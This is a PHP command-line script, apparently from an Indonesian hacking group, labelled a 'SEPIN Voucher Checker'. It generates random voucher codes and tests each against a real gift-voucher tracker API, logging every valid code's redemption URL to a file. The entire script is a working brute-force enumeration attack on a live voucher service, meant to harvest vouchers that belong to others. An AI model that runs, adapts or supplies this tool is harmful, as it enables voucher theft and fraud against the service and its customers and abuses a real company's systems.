<?php

// THX TO Manggala Febri Valentino
// CRT BY BIMA_GATES
// FOR SGB_TEAM
// ERROR = LAPOR YH

date_default_timezone_set("Asia/Jakarta");
function read($length='255')
{
   if (!isset ($GLOBALS['StdinPointer']))
   {
      $GLOBALS['StdinPointer'] = fopen ("php://stdin","r");
   }
   $line = fgets ($GLOBALS['StdinPointer'],$length);
   return trim ($line);
}
function getStr($string,$start,$end)
{
	$str = explode($start,$string);
	$str = explode($end,$str[1]);
	return $str[0];
}
function chatime()
{
    $code = "811".rand(111111111,999999999);
    $ch = curl_init();

    curl_setopt($ch, CURLOPT_URL, "http://sepin.giftn.co.id/api/Resource/Tracker?tr=tr_str&cop_id=EC1045&wid=kfc&epin=$code");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
    
    curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
    
    $headers = array();
    $headers[] = "application/json; charset=utf-8";
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    
    $result = curl_exec($ch);
    $err = curl_error($ch);
    curl_close($ch);
    if ($err) {
    echo "cURL Error #:" . $err;
    } else if (strpos($result,'Y')) {
      $name = getStr($result,'"gds_name":"','"');
      $buat_file = fopen("SEPIN_LIVE.txt", "a") or die("Unable to open file!");
      $tulis = ("http://sepin.giftn.co.id/pop/confirmation?p=$code \r\n");
      fwrite($buat_file, $tulis);
      fclose($buat_file);
      echo "Code: ".$code." - \033[1;32mSuccessfully\033[0m";
    } else if (!strpos($result,'Y') && strpos($result,'N')) {
      echo "Code: ".$code." - \033[31mNot Found\033[0m";
    } else {
      echo $result;
    }
}
echo "SEPIN Voucher Checker by BIMA_GATES\n\n";
echo "Input Jumlah: ";
$jumlah = read();
for ($x = 0; $x <= $jumlah; $x++){
    $cus = chatime();
    echo ' '. date("H:i:s").  ' ' .$cus. "\n";
}
?>
